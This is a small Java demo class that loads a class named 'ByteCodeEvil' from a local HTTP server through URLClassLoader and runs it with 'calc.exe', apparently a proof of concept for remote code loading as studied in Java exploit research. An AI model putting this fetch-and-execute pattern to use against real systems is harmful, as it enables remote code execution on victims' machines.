package com.URL;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class URLTest {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        URL url = new URL("http://127.0.0.1:8000/");
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class<?> clazz = loader.loadClass("com.ByteCodeEvil");
        Constructor<?> constructor = clazz.getConstructor(String.class);
        constructor.newInstance("calc.exe");

    }
}
